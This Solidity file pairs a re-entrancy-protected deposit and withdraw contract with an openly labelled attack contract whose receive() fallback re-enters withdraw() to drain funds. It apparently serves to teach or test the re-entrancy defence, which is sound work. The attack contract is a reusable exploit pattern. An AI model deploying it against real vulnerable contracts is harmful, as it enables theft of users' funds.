// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title ReEntrancyContract
/// @notice A contract that manages balances and allows deposit and withdrawal operations with a re-entrancy protection mechanism.
contract ReEntrancyContract {
    bool internal locked;
    mapping(address => uint) private balances;

    /// @notice Deposits Ether into the contract for the caller's account.
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice Withdraws the caller's balance from the contract.
    function withdraw() external noReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
    }

    /// @notice Returns the balance of the contract.
    /// @return The balance of the contract.
    function getContractBalance() external view returns (uint) {
        return address(this).balance;
    }

    /// @dev Modifier to prevent re-entrancy attacks.
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

/// @title ReEntrancyAttack
/// @notice A contract representing an attack on the ReEntrancyContract by attempting to exploit re-entrancy vulnerability.
contract ReEntrancyAttack {
    ReEntrancyContract public target;

    /// @notice Constructs the ReEntrancyAttack contract, specifying the address of the target ReEntrancyContract.
    /// @param _target The address of the ReEntrancyContract to attack.
    constructor(address _target) {
        target = ReEntrancyContract(_target);
    }

    /// @notice Fallback function that is called when the contract receives Ether.
    /// @dev Checks the balance of the target contract and triggers a withdrawal if it meets the condition.
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    /// @notice Initiates the attack by depositing Ether into the target contract and triggering a withdrawal.
    function attack() external payable {
        require(msg.value >= 1 ether, "Require 1 Ether to attack");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    /// @notice Returns the balance of the ReEntrancyAttack contract.
    /// @return The balance of the ReEntrancyAttack contract.
    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
